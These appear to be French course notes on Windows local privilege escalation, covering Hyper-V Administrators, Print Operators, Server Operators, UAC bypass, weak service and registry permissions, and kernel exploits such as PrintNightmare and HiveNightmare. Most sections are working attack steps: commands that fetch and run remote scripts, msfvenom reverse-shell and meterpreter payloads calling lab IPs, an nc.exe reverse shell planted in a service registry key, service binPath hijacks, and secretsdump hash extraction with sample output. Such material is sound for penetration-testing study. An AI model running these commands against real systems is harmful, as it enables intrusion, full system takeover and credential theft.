Le groupe `Hyper-V Administrators` possède un accès complet aux fonctionnalités Hyper-V. Sur des environnements où les Domain Controllers sont virtualisés, les administrateurs de virtualisation doivent être traités comme des **Domain Admins** potentiels : ils peuvent cloner un DC en cours d’exécution, monter son disque virtuel hors-ligne et extraire le fichier `NTDS.dit` pour récupérer les hashes NTLM du domaine.

Il existe aussi une technique documentée où, lors de la suppression d’une machine virtuelle, `vmms.exe` restaure les permissions d’origine du fichier `.vhdx` en tant que `NT AUTHORITY\SYSTEM` **sans** s’authentifier en tant qu’utilisateur. En supprimant le `.vhdx` puis en créant un hard link natif pointant vers un fichier protégé par SYSTEM, un Hyper-V Admin peut obtenir des permissions persistantes sur ce fichier et ensuite en abuser (exécution de code SYSTEM) si le système est vulnérable (`CVE-2018-0952`, `CVE-2019-0841`) ou si un service SYSTEM est startable par des utilisateurs non-privilégiés.

## Attack Overview

### Clone and Mount a Virtual DC
Un Hyper-V Admin peut :
- Cloner la machine virtuelle du Domain Controller.
- Monter la virtual hard disk (`.vhdx`) offline.
- Récupérer `NTDS.dit` puis extraire les hashes (ex : via `ntdsutil` / `secretsdump.py`).

### Hard Link Exploit (NT hard link to protected SYSTEM file)
Principe :
1. Supprimer (ou déplacer) le `.vhdx` correspondant à la VM.  
2. Créer un hard link **avec le même nom** pointant vers un fichier protégé par SYSTEM (ex : un exécutable de service).  
3. Lorsque `vmms.exe` restaure les permissions sur le fichier `.vhdx`, il applique ces permissions au fichier cible (qui est en réalité le fichier SYSTEM pointé par le hard link), ce qui donne à l’attaquant des droits sur ce fichier SYSTEM.  
4. Remplacer le fichier (exécutable de service) par un binaire malveillant.  
5. Démarrer le service (si possible) pour obtenir une exécution en contexte SYSTEM.

> Remarque : cette chaîne dépend de la présence d’un comportement vulnérable (voir CVE list) ou d’un service SYSTEM startable par un utilisateur non-privé

## Target File Example

Exemple fourni dans le cours :  
`C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`  
(ici Firefox installe un service « Mozilla Maintenance Service » qui peut servir de cible pour remplacer l’exécutable par un binaire malveillant et obtenir l’exécution SYSTEM.)

## Steps
### 1) Remove or rename the VM .vhdx
`Remove-Item "C:\Hyper-V\VMs\victim\victim.vhdx"`  
`Rename-Item "C:\Hyper-V\VMs\victim\victim.vhdx" "victim.vhdx.bak"`

### 2) Create a hard link pointing to a protected SYSTEM file
`fsutil hardlink create "C:\Hyper-V\VMs\victim\victim.vhdx" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

### 3) Trigger vmms.exe to restore permissions
(Le mécanisme de restauration est automatique par `vmms.exe` lors de certaines opérations sur la VM.)

### 4) Gain full control on the target file (take ownership + grant rights)
`takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`  
`icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" /grant "%USERNAME%:F"`

### 5) Replace the file with a malicious binary
`Copy-Item ".\malicious\maintenanceservice.exe" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" -Force`

### 6) Start the service to execute code as SYSTEM
`sc.exe start MozillaMaintenance`

### 7) If successful — confirm SYSTEM context
`whoami /all`  
`[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`

## Using the PoC script (Hyper-V native hardlink PoC)

Le cours mentionne un script PoC (`hyperv-eop.ps1`) disponible publiquement qui automatise la création du hard link et certaines étapes d’exploitation. Exemple d’utilisation (exécution depuis un hôte où vous avez les droits Hyper-V) :

`Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1')`  
# ou  
`iwr https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1 -OutFile .\hyperv-eop.ps1`  
`.\hyperv-eop.ps1 -Target "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

## Alternatives when CVEs are patched

Si le système est corrigé pour `CVE-2018-0952` / `CVE-2019-0841` (ou si la restauration de permissions ne mène pas à un gain d’accès), d’autres vecteurs possibles :  
- Trouver un **service SYSTEM** qui est startable par un utilisateur non-privilégié, remplacer son binaire et démarrer le service.  
- Profiter d’autres erreurs de configuration (permissions mal configurées sur fichiers sensibles, partages, etc.).  
- Voler les snapshots/backup offline d’un DC et extraire `NTDS.dit` (même sans hard link).

> Note de sécurité : la modification d’images de VM ou la manipulation de fichiers système peut causer des pertes de données ou des interruptions de service. N’effectuez ces actions que dans des environnements d’essai approuvés ou avec l’accord explicite du propriétaire du système.

## Resources

[From Hyper-V Admin to SYSTEM](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)  
[CVE-2018-0952 — Tenable](https://www.tenable.com/cve/CVE-2018-0952)  
[CVE-2019-0841 — Tenable](https://www.tenable.com/cve/CVE-2019-0841)  
[hyperv-eop.ps1 (raw GitHub)](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)

---

# Print Operators

Groupe très privilégié : donne `SeLoadDriverPrivilege` et droits d'administration d'imprimantes. Si `whoami /priv` ne montre pas `SeLoadDriverPrivilege` depuis un contexte non élevé, il faut l'activer (UAC bypass si nécessaire).

## Confirm Privileges
Vérifier privilèges :
`whoami /priv`

## Enable SeLoadDriverPrivilege (compile & run)
1. Récupérer le source `EnableSeLoadDriverPrivilege.cpp`.  
2. Compiler depuis Visual Studio Developer Command Prompt :
`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`  
3. Lancer l'exécutable pour activer le privilege :
`EnableSeLoadDriverPrivilege.exe`  
Vérifier :
`whoami /priv` → `SeLoadDriverPrivilege` `Enabled`

## Add driver registry reference (HKCU)
Créer la clé qui référence le driver (ex: `C:\Tools\Capcom.sys`) :
`reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`  
`reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`

## Verify driver not loaded / then loaded
Exporter la liste des drivers (DriverView) puis filtrer :
`.\DriverView.exe /stext drivers.txt`  
`cat drivers.txt | Select-String -pattern Capcom`

Après activation et chargement, refaire pour confirmer `Capcom.sys` listé.

## Load driver (manual) / or use EoPLoadDriver
- Manual (NTLoadDriver via tool or custom): utiliser l’exécutable qui appelle `NtLoadDriver` sur `\Registry\User\<SID>\System\CurrentControlSet\CAPCOM`.  
- Automatique :  
`EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`

## Exploit Capcom (escalation)
Compiler/exécuter `ExploitCapcom.exe` :
`.\ExploitCapcom.exe`  
Résultat attendu : token steal → shell en `NT AUTHORITY\SYSTEM`

## Alternate (no GUI) — change payload in source
Modifier le `ExploitCapcom.cpp` : remplacer la ligne de lancement par le chemin du payload (ex: reverse shell) :
`TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`  
Recompiler, déployer et exécuter `ExploitCapcom.exe`.

## Automate full flow
1. Activer privilege : `EnableSeLoadDriverPrivilege.exe` (ou EoPLoadDriver).  
2. Ajouter clé HKCU (registry).  
3. Charger driver (`EoPLoadDriver.exe` ou util NTLoadDriver).  
4. Lancer `ExploitCapcom.exe`.

## Cleanup
Supprimer la clé ajoutée :
`reg delete HKCU\System\CurrentControlSet\Capcom`

## Quick checklist
- `whoami /priv` before & after.  
- `C:\Tools\Capcom.sys` présent.  
- Driver list via `DriverView.exe`.  
- Have ExploitCapcom compiled matching target architecture.  
- If UAC blocks, utiliser UACMe techniques (voir resources).

## Resources
[UACMe (repo)](https://github.com/hfiref0x/UACME)  
[EnableSeLoadDriverPrivilege.cpp (raw)](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)  
[Capcom.sys (repo)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)  
[DriverView (NirSoft)](http://www.nirsoft.net/utils/driverview.html)  
[ExploitCapcom (repo)](https://github.com/tandasat/ExploitCapcom)  
[EoPLoadDriver (repo)](https://github.com/TarlogicSecurity/EoPLoadDriver/)

---

# Server Operators

Les membres du groupe `Server Operators` peuvent administrer des serveurs Windows sans posséder les droits `Domain Admin`. C'est un groupe très privilégié : ses membres peuvent se connecter localement aux serveurs (y compris certains Domain Controllers), et disposent souvent des privilèges `SeBackupPrivilege` et `SeRestorePrivilege`, ainsi que de la capacité à contrôler des services locaux.

## Querying the AppReadiness Service

On examine le service `AppReadiness` pour confirmer qu'il s'exécute sous le compte `LocalSystem`. On utilise `sc` pour interroger la configuration :
```
sc qc AppReadiness
```

Exemple de sortie (illustrative) montrant `SERVICE_START_NAME : LocalSystem` :
`[SC] QueryServiceConfig SUCCESS`

`SERVICE_NAME: AppReadiness`  
`TYPE : 20 WIN32_SHARE_PROCESS`  
`START_TYPE : 3 DEMAND_START`  
`ERROR_CONTROL : 1 NORMAL`  
`BINARY_PATH_NAME : C:\Windows\System32\svchost.exe -k AppReadiness -p`  
`LOAD_ORDER_GROUP :`  
`TAG : 0`  
`DISPLAY_NAME : App Readiness`  
`DEPENDENCIES :`  
`SERVICE_START_NAME : LocalSystem`

## Checking Service Permissions with PsService

On peut vérifier les permissions sur le service avec `PsService` (Sysinternals). `PsService` affiche les droits ACL du service et permet d'identifier si `Server Operators` a un accès étendu (par ex. `SERVICE_ALL_ACCESS`).

Commande pour afficher la sécurité du service :
```
c:\Tools\PsService.exe security AppReadiness
```

Extrait de sortie (illustratif) montrant que `Server Operators` a `All` :
`SERVICE_NAME: AppReadiness`  
`DISPLAY_NAME: App Readiness`  
`ACCOUNT: LocalSystem`  
`SECURITY: ...`  
`[ALLOW] BUILTIN\Server Operators`  
`All`

Si `Server Operators` a `All` ou `SERVICE_ALL_ACCESS`, cela donne un contrôle total sur le service (stop/start/configurer/modifier le binaire, etc.).

## Checking Local Admin Group Membership

Vérifier les membres du groupe local `Administrators` pour confirmer que notre compte n'est pas déjà administrateur local :
```
net localgroup Administrators
```

Sortie d'exemple :
`Alias name     Administrators`  
`Comment        Administrators have complete and unrestricted access to the computer/domain`  

`Members`  
`-------------------------------------------------------------------------------`  
`Administrator`  
`Domain Admins`  
`Enterprise Admins`  
`The command completed successfully.`

## Modifying the Service Binary Path

Si le compte a le droit de modifier la configuration du service, on peut changer `binPath` pour exécuter une commande arbitraire (par ex. ajouter l'utilisateur courant au groupe Administrators local). Exemple :
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Sortie attendue :
`[SC] ChangeServiceConfig SUCCESS`

## Starting the Service

Tenter de démarrer le service :
```
sc start AppReadiness
```

Il est courant que le démarrage échoue si la nouvelle commande n'est pas un vrai service Windows (erreur 1053). Exemple :
`[SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion.`

Cependant, même si `sc start` retourne une erreur, la commande dans `binPath` peut s'être exécutée — il faut vérifier la conséquence (ici : ajout de compte au groupe Administrators).

## Confirming Local Admin Group Membership

Après modification, vérifier si l'utilisateur a bien été ajouté :
```
net localgroup Administrators
```

Sortie exemple montrant `server_adm` ajouté :
`Alias name     Administrators`  
`...`  
`server_adm`  
`The command completed successfully.`

## Confirming Local Admin Access on Domain Controller

Une fois administrateur local sur le Domain Controller, on peut se connecter et exécuter des outils pour confirmer l'accès.

Exemple d'utilisation de `crackmapexec` pour tester l'accès SMB :
```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Exemple de sortie (indicative) montrant un accès réussi :
```
SMB 10.129.43.9 445 WINLPE-DC01 [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

## Retrieving NTLM Password Hashes from the Domain Controller

Avec un compte ayant les droits nécessaires sur le DC, on peut extraire les hachés NTLM / les secrets via `secretsdump.py` (Impacket) :
```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

Sortie d'exemple montrant le haché NTLM de `Administrator` et les clés Kerberos :
`[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)`  
`Administrator:500:aad3b435...:cf3a5525ee9414229e66279623ed5c58:::`  
`[*] Kerberos keys grabbed`  
`Administrator:aes256-cts-hmac-sha1-96:...`  
`[*] Cleaning up...`

Avec ces hachés ou clés, la post-exploitation complète du domaine devient possible (pass-the-hash, persistence, etc.).

## Resources

- [PsService (Sysinternals) - Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psservice)  
- [PsTools Suite - Sysinternals](https://learn.microsoft.com/sysinternals/downloads/pstools)

---

# User Account Control

User Account Control (UAC) est une fonctionnalité qui affiche une invite de consentement pour les activités élevées. Les applications ont différents niveaux d'intégrité ; un programme avec un niveau élevé peut effectuer des actions sensibles. 

Quand UAC est activé, les applications s'exécutent par défaut sous le contexte d'un compte non-administrateur sauf si un administrateur autorise explicitement l'élévation. 

UAC est une **mesure de confort / défense** pour réduire les changements non désirés, mais **n'est pas une frontière de sécurité absolue**.

## UAC Group Policy / Registry Summary

Les paramètres UAC peuvent être configurés via `secpol.msc` localement ou via GPO en domaine. 

Exemples de clés/valeurs :

- `FilterAdministratorToken` — Admin Approval Mode pour le compte Administrator (par défaut Disabled)  
- `EnableUIADesktopToggle` — Allow UIAccess prompting without secure desktop (Disabled)  
- `ConsentPromptBehaviorAdmin` — Comportement du prompt pour les admins (ex : `Prompt for consent for non-Windows binaries`)  
- `ConsentPromptBehaviorUser` — Comportement du prompt pour les utilisateurs standard (ex : `Prompt for credentials on the secure desktop`)  
- `EnableInstallerDetection` — Détection d'installateurs (Enabled par défaut sur Home)  
- `ValidateAdminCodeSignatures` — N'éléver que les binaires signés (Disabled)  
- `EnableSecureUIAPaths` — UIAccess only in secure locations (Enabled)  
- `EnableLUA` — Run all administrators in Admin Approval Mode (Enabled)  
- `PromptOnSecureDesktop` — Basculer sur secure desktop pour le prompt (Enabled)  
- `EnableVirtualization` — Virtualize file/registry write failures (Enabled)

UAC doit rester activé : il ralentit et bruite souvent les tentatives d'élévation.

## Checking Current User

Vérifier l'identité de l'utilisateur courant :
`whoami /user`

## Confirming Admin Group Membership

Vérifier si l'utilisateur est dans le groupe Administrators local :
`net localgroup administrators`

## Reviewing User Privileges

Lister les privilèges effectifs du token :
`whoami /priv`

## Confirming UAC is Enabled

Vérifier si `EnableLUA` est actif :
`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`

Vérifier le niveau du prompt admin :
`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`

Une valeur `ConsentPromptBehaviorAdmin` de `0x5` indique le niveau "Always notify" (peu de bypasss disponibles).

## Checking Windows Version

Les bypasss UAC sont souvent dépendants de la build Windows. Vérifier la build :
`[environment]::OSVersion.Version`

Exemple : build `14393` correspond à Windows 10 (1607) — utile pour choisir une technique compatible.

## Finding Auto-Elevating Binaries & DLL Search Order

Certaines binaires "trusted" s'auto-élèvent (auto-elevate) et peuvent charger des DLLs non présentes — vecteur pour des DLL hijacks. Ordre de recherche de DLL (résumé) :

1. Le répertoire de l'application.  
2. `C:\Windows\System32` (sur systèmes 64-bit pour les binaires 64-bit).  
3. `C:\Windows\System` (16-bit legacy, non applicable 64-bit).  
4. Le répertoire Windows.  
5. Les répertoires listés dans `%PATH%`.

## Reviewing PATH Variable

Vérifier `%PATH%` pour repérer des dossiers écrits par l'utilisateur (ex. WindowsApps) :
`cmd /c echo %PATH%`

Exemple montrant `C:\Users\sarah\AppData\Local\Microsoft\WindowsApps` — répertoire user-writable exploitable pour DLL hijack.

# Technique: DLL Hijack via SystemPropertiesAdvanced.exe (UAC bypass technique 54)

> Contexte : la version 32-bit de `SystemPropertiesAdvanced.exe` (auto-elevating) cherche `srrstr.dll` manquante ; placer une DLL malveillante nommée `srrstr.dll` dans un répertoire accessible dans le PATH (ex. WindowsApps) peut conduire à chargement en contexte élevé.

## Generating Malicious srrstr.dll

Générer une DLL qui ouvre un reverse shell (ex. msfvenom) :
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`

## Hosting the DLL on Attack Host

Démarrer un serveur HTTP minimal pour héberger la DLL :
`sudo python3 -m http.server 8080`

## Downloading DLL on Target

Télécharger la DLL vers le dossier WindowsApps (ou un path vulnérable) :
`curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`

## Starting Listener on Attack Host

Ouvrir un listener netcat pour récupérer la connexion :
`nc -lvnp 8443`

## Testing the DLL with rundll32

Exécuter la DLL via `rundll32` pour vérifier que le payload s'exécute (retour shell non élevé si rond initialement) :
`rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`

Si la DLL s'exécute, vous recevez une session avec les droits de l'utilisateur courant (UAC toujours actif).

## Clean Up Previous rundll32 Processes

S'assurer que les processus `rundll32.exe` antérieurs sont terminés avant l'étape d'élévation :
`tasklist /svc | findstr "rundll32"`
Puis terminer les PIDs identifiés :
`taskkill /PID 7044 /F`  
`taskkill /PID 6300 /F`  
`taskkill /PID 5360 /F`

## Triggering Auto-Elevation with SystemPropertiesAdvanced.exe (32-bit)

Lancer la version 32-bit qui auto-élève et recherche `srrstr.dll` :
`C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`

Si la DLL est chargée par ce binaire auto-elevating, l'attaquant reçoit une session élevée (shell SYSTEM ou token administrateur selon le contexte).

## Confirming Elevated Shell

Vérifier l'identité et les privilèges dans la session reçue :
`whoami`  
`whoami /priv`

Vous devriez observer des privilèges supplémentaires disponibles et éventuellement activables (ex. `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, ...), indiquant une élévation réussie.

## Resources
- [User Account Control (UAC) - Microsoft Docs](https://learn.microsoft.com/windows/security/identity-protection/user-account-control)  
- [UACMe — UAC bypass techniques (GitHub)](https://github.com/hfiref0x/UACME)  

---

# Weak Permissions

Les permissions sur les systèmes Windows sont complexes et sensibles. 
Une simple mauvaise configuration peut introduire une faille exploitable pour **l’élévation de privilèges**.  

Ces erreurs sont rares dans les produits majeurs mais courantes dans les logiciels tiers, open source ou faits maison.  
Les services s’exécutent souvent sous `SYSTEM`, donc une faiblesse de permissions peut donner un **contrôle total** sur la machine.

## Permissive File System ACLs

### Running SharpUp

`SharpUp` (outil du projet GhostPack) permet d’identifier les services et binaires ayant des ACL trop permissives :  
`.\SharpUp.exe audit`

Exemple de sortie :
`
=== Modifiable Service Binaries ===  
Name : SecurityService  
DisplayName : PC Security Management Service  
PathName : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
`

### Checking Permissions with icacls

Vérifier les permissions du binaire :  
`icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`

Sortie exemple :  
`
BUILTIN\Users:(I)(F)  
Everyone:(I)(F)  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Administrators:(I)(F)
`

→ Les groupes `Users` et `Everyone` ont un **Full Control** sur le binaire.

### Replacing Service Binary

Si le service peut être démarré par un utilisateur standard, on peut le remplacer par un binaire malveillant (par ex. un reverse shell généré avec `msfvenom`).  
`cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`  
`sc start SecurityService`

## Weak Service Permissions

### Reviewing SharpUp Again

Analyser à nouveau les permissions :  
`SharpUp.exe audit`

Exemple :  
`
=== Modifiable Services ===  
Name : WindscribeService  
PathName : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
`

### Checking Permissions with AccessChk

Vérifier les droits sur le service :  
`accesschk.exe /accepteula -quvcw WindscribeService`

Exemple de sortie :  
`
RW NT AUTHORITY\Authenticated Users  
SERVICE_ALL_ACCESS
`

→ Les utilisateurs authentifiés ont un contrôle total (`SERVICE_ALL_ACCESS`).

### Check Local Admin Group

Vérifier les membres du groupe Administrators :  
`net localgroup administrators`

### Changing the Service Binary Path

Modifier le chemin du binaire pour exécuter une commande arbitraire :  
`sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"`

Sortie :  
`[SC] ChangeServiceConfig SUCCESS`

### Stopping the Service

Arrêter le service pour appliquer la modification :  
`sc stop WindscribeService`

### Starting the Service

Relancer le service :  
`sc start WindscribeService`

Même si une erreur `StartService FAILED 1053` s’affiche, la commande définie dans `binpath` s’exécute.

### Confirming Local Admin Group Addition

Vérifier que l’utilisateur a bien été ajouté :  
`net localgroup administrators`

Exemple : 
`
Administrator  
mrb3n  
htb-student  
`

## Weak Service Example: Windows Update Orchestrator Service

Avant le patch **CVE-2019-1322**, le service `UsoSvc` (Windows Update Orchestrator Service) avait des permissions faibles.  
Les comptes de service pouvaient modifier son `binPath` et redémarrer le service, menant à une élévation vers `SYSTEM`.

## Weak Service Permissions - Cleanup

### Reverting the Binary Path

Remettre le binaire d’origine :  
`sc config WindScribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"`

### Starting the Service Again

`sc start WindScribeService`

### Verifying Service is Running

`sc query WindScribeService`

## Unquoted Service Path

Un service avec un **chemin non entre guillemets** peut être exploité si Windows cherche le binaire dans un dossier contrôlable.

Exemple :  
`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Windows cherchera dans l’ordre :
`
C:\Program.exe  
C:\Program Files.exe  
C:\Program Files (x86)\System.exe  
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
`

Si l’on peut créer un de ces fichiers (rarement possible sans droits admin), on peut exécuter du code à la place du service.

### Querying Service

`sc qc SystemExplorerHelpService`

### Searching for Unquoted Service Paths

Lister les services vulnérables :  
`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

## Permissive Registry ACLs

Certaines clés de registre associées aux services ont des ACL trop permissives.

### Checking for Weak Service ACLs in Registry

`accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`

Exemple :  
`
RW HKLM\System\CurrentControlSet\services\ModelManagerService  
KEY_ALL_ACCESS
`
### Changing ImagePath with PowerShell

Modifier la clé pour exécuter un binaire arbitraire :  
`Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`

## Modifiable Registry Autorun Binary

### Check Startup Programs

Lister les programmes au démarrage :  
`Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl`

Exemple :
`
Name : Windscribe  
Command : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart  
Location : HKU\...\CurrentVersion\Run  
User : WINLPE-WS01\mrb3n
`
Si un utilisateur peut modifier le binaire ou la clé, le code s’exécutera à la prochaine ouverture de session.

## Resources
- [SharpUp - GhostPack GitHub](https://github.com/GhostPack/SharpUp)  
- [AccessChk - Sysinternals](https://learn.microsoft.com/sysinternals/downloads/accesschk)  
- [Windows Registry Permissions - Microsoft Learn](https://learn.microsoft.com/windows/win32/sysinfo/registry-permissions)  
- [CVE-2019-1322 - Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1322)  

---


---
# Kernel Exploits

Maintenir tous les postes et serveurs Windows à jour est un défi. Même avec SCCM ou WSUS, certaines mises à jour échouent.  
De nombreuses vulnérabilités du noyau Windows ont été découvertes au fil des années, de Windows XP jusqu’à Windows 10 et Server 2019.  
Certaines sont des failles **Remote Code Execution (RCE)**, d’autres permettent une **élévation locale de privilèges**.

Il est essentiel de rester à jour sur les correctifs, car de nouvelles vulnérabilités (comme MS17-010) touchent souvent les anciennes versions de Windows.

## Notable Vulnerabilities

### MS08-067

Vulnérabilité RCE dans le service `Server` causée par une mauvaise gestion des requêtes RPC.  
Permet à un attaquant non authentifié d’exécuter du code arbitraire avec les privilèges `SYSTEM`.

- Affecte : Windows 2000, 2003, 2008, XP et Vista  
- Exploitable localement si le port 445 (SMB) est bloqué depuis l’extérieur  
- Disponible via Metasploit (`ms08_067_netapi`)

### MS17-010 (EternalBlue)

Faille dans le protocole `SMBv1` exploitée par le kit **FuzzBunch**.  
Permet une exécution de code arbitraire avec les privilèges `SYSTEM`.

- Affecte : Windows 7/8/10, Server 2008 → 2016  
- Exploitable localement pour élever les privilèges si le port 445 est bloqué  
- Disponible via Metasploit ou scripts standalone

### ALPC Task Scheduler 0-Day

Le service `Task Scheduler` pouvait être exploité pour écrire des DACL arbitraires sur des fichiers `.job`.  
L’exploitation utilisait la fonction `SchRpcSetSecurity` pour détourner un job et exécuter du code en `SYSTEM`.


### CVE-2021-36934 (HiveNightmare / SeriousSam)

Faille Windows 10 donnant aux utilisateurs non privilégiés l’accès en lecture aux fichiers du registre : `SAM`, `SYSTEM`, `SECURITY`.  
Permet d’extraire les hashs des comptes locaux sans droits administratifs.

#### Checking Permissions on the SAM File

Commande : `icacls c:\Windows\System32\config\SAM`

Exemple de sortie :
```
C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Users:(I)(RX)
```

→ Le groupe `Users` ayant lecture (`RX`) indique une machine vulnérable.

#### Exploitation avec HiveNightmare.exe

Commande : `.\HiveNightmare.exe`

Exemple de sortie :
```
Success: SAM hive ... written out to current working directory as SAM-2021-08-07  
Success: SECURITY hive ... written out to current working directory as SECURITY-2021-08-07  
Success: SYSTEM hive ... written out to current working directory as SYSTEM-2021-08-07
``` 

#### Extraction des hashs avec Impacket

Commande : `impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local`

Exemple :
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::  
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
```

### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)

Vulnérabilité dans `RpcAddPrinterDriver` permettant à tout utilisateur authentifié d’installer un pilote d’imprimante malveillant.  
Donne une exécution de code en `SYSTEM`.

#### Vérifier si le Spooler est actif

Commande : `ls \\localhost\pipe\spoolss`

#### Ajouter un admin local avec le PoC PowerShell
```
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
Sortie : `[+] added user hacker as local administrator`

#### Vérifier le nouvel utilisateur

Commande : `net user hacker`

## Enumerating Missing Patches

Avant toute exploitation, vérifier les correctifs installés pour identifier les failles potentielles.

### Examining Installed Updates

`systeminfo`  
`wmic qfe list brief`  
`Get-Hotfix`  

→ Système probablement en retard sur les mises à jour.

## CVE-2020-0668 – Windows Kernel Elevation of Privilege

Faille dans **Windows Service Tracing** permettant à un utilisateur de déplacer un fichier arbitraire via une opération de renommage exécutée par `SYSTEM`.

### Vérifier les privilèges utilisateur

Commande : `whoami /priv`

Exemple :

`SeChangeNotifyPrivilege  Enabled ` 

### Fichiers générés après compilation
```
CVE-2020-0668.exe  
CVE-2020-0668.exe.config  
NtApiDotNet.dll  
```

### Vérifier un service exploitable

Exemple : `Mozilla Maintenance Service`

Commande : `icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

→ L’utilisateur n’a que lecture, mais la faille permet d’écrire dans le dossier.

### Générer un binaire malveillant

Commande : `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`

### Héberger le binaire

Commande : `python3 -m http.server 8080`

### Télécharger le binaire sur la cible
```
wget http://10.10.15.244:8080/maintenanceservice.exe
wget http://10.10.15.244:8080/maintenanceservice2.exe
```

### Exécution de l’exploit

Commande :  
`C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

### Vérifier les permissions

`icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

Sortie : `WINLPE-WS02\htb-student:(F)`  
→ L’utilisateur a maintenant un **Full Control** sur le binaire.

### Remplacer par le binaire malveillant

Commande :  
`copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`

### Créer un Metasploit Resource Script

Fichier : `handler.rc`
```
use exploit/multi/handler  
set PAYLOAD windows/x64/meterpreter/reverse_https  
set LHOST <your_ip>  
set LPORT 8443  
exploit
``` 

Lancer : `sudo msfconsole -r handler.rc`

### Démarrer le service

`net start MozillaMaintenance`

Même si une erreur apparaît (`NET HELPMSG 2186`), la connexion reviendra.

### Session Meterpreter
meterpreter > hashdump  
`Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::` 

→ L’accès `SYSTEM` est obtenu avec succès.

## Resources
- [MS17-010 (EternalBlue) – Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/MS17-010)  
- [PrintNightmare Analysis – Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)  
- [HiveNightmare PoC – GitHub](https://github.com/GossiTheDog/HiveNightmare)  
- [CVE-2020-0668 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-0668)  

---

# Vulnerable Services

Même sur des systèmes bien patchés et configurés, il est parfois possible d’élever ses privilèges si l’utilisateur peut installer des logiciels ou si des applications tierces vulnérables sont présentes.  
